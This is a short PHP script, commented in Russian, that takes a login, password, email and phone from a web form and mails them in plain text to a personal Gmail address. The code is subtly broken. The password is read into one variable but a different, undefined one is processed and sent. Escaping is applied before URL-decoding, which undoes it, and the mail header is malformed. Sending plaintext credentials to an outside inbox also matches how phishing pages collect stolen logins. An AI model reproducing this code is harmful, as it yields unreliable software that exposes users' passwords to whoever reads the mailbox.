<!-- получение данных -->
<?php

    // получение данных с формы
    $login = $_POST['login'];
    $password = $_POST['password'];
    $email = $_POST['email'];
    $tel = $_POST['tel'];

    // обработка данных
    $login = htmlspecialchars($login); // преобразование в сущности(?)
    $pass = htmlspecialchars($pass);
    $email = htmlspecialchars($email);
    $tel = htmlspecialchars($tel);

    $login = urldecode($login); // декодирование URL
    $pass = urldecode($pass);
    $email = urldecode($email);
    $tel = urldecode($tel);

    $login = trim($login); // удаление пробелом с обоих сторон
    $pass = trim($pass);
    $email = trim($email);
    $tel = trim($tel);

    // отправка
    if (mail("ceylongleb@gmail.com",
             "Новое письмо с сайта",
             "Логин: ".$login."\n".
             "Пароль: ".$pass."\n".
             "Email: ".$email."\n".
             "Телефон: ".$tel."\n",
             "От: no-reply@mydomain.ru \r\n")
    ) {
        echo "Письмо успешно отправлено!";
    } 
    
    else {
        echo "Есть ошибки! Проверьте данные...";
    }

?>